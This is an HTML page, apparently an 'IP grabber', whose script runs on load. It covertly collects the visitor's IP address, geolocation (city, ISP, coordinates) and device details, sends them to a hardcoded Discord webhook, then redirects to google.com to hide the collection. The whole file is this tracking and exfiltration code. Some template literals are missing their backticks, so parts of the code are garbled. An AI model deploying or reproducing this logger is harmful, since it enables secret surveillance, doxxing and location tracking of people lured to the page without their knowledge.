<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Visitor Info Logger</title>
</head>
<body>
    <h1>Gathering Information...</h1>
    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
        const redirectURL = 'https://www.google.com';

        // Function to get IP and location details
        async function getIPAddressAndLocation() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const { ip } = await response.json();
                const locationResponse = await fetch(https://ip-api.com/json/${ip});
                const locationData = await locationResponse.json();

                return {
                    ip,
                    location: locationData.status === "success" ? locationData : null
                };
            } catch (error) {
                console.error('Error fetching IP or location:', error);
                return { ip: 'Unknown', location: null };
            }
        }

        // Function to collect additional device information
        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const colorDepth = window.screen.colorDepth + ' bits';
            const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';

            let os = 'Unknown';
            if (/windows nt/i.test(userAgent)) {
                const versionMatch = userAgent.match(/windows nt (\d+\.\d+)/i);
                os = versionMatch ? Windows ${versionMatch[1]} : 'Windows';
            } else if (/mac os x/i.test(userAgent)) {
                const versionMatch = userAgent.match(/mac os x (\d+_\d+)/i);
                os = versionMatch ? macOS ${versionMatch[1].replace('_', '.')} : 'macOS';
            } else if (/linux/i.test(userAgent)) {
                os = 'Linux';
            } else if (/android/i.test(userAgent)) {
                const versionMatch = userAgent.match(/android (\d+\.\d+)/i);
                os = versionMatch ? Android ${versionMatch[1]} : 'Android';
            } else if (/iphone|ipad|ipod/i.test(userAgent)) {
                const versionMatch = userAgent.match(/os (\d+_\d+)/i);
                os = versionMatch ? iOS ${versionMatch[1].replace('_', '.')} : 'iOS';
            }

            return 
                User-Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Timezone: ${timezone}
                OS: ${os}
                Color Depth: ${colorDepth}
                Cookies Enabled: ${cookiesEnabled}
            ;
        }

        // Function to send data to Discord webhook
        async function sendToDiscord() {
            const { ip, location } = await getIPAddressAndLocation();
            const deviceInfo = await getDeviceInfo();
            const timestamp = new Date().toLocaleString();

            const locationDetails = location
                ? 
                City: ${location.city}
                Region: ${location.regionName}
                Country: ${location.country}
                ISP: ${location.isp}
                Timezone: ${location.timezone}
                Latitude: ${location.lat}
                Longitude: ${location.lon}
                
                : 'Location information unavailable';

            const payload = {
                embeds: [{
                    title: "ðŸ“‹ Visitor Information Logged",
                    color: 3447003,
                    fields: [
                        { name: "IP Address", value: ip, inline: true },
                        { name: "Device Info", value: \\\${deviceInfo}\\\` },
                        { name: "Approximate Location", value: \\\${locationDetails}\\\` }
                    ],
                    footer: { text: Logged at: ${timestamp} }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Visitor info logged successfully');
                    window.location.href = redirectURL;
                } else {
                    console.error('Failed to log visitor info:', response.statusText);
                }
            })
            .catch(error => console.error('Error sending to webhook:', error));
        }

        // Execute the data collection and logging
        sendToDiscord();
    </script>
</body>
</html>
